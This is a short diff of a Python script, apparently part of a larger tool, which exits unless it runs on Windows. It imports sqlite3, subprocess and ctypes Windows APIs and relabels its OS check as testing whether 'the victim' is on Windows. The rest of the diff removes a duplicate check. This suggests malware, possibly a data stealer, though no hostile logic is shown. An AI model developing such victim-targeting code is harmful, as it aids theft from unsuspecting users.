@@ -874,7 +874,7 @@ from subprocess import check_output, CalledProcessError
 from os import name
 
 
-# QUICK CHECK
+# QUICK CHECK IF THE VICTIM IS ON WINDOWS
 
 if name != 'nt':
     exit()
@@ -931,9 +931,6 @@ from sqlite3 import connect
 from ctypes import Structure, wintypes, c_char, create_string_buffer, sizeof, byref, WinError, string_at, POINTER, windll
 
 
-
-if name != 'nt':
-    exit()
 
 
 
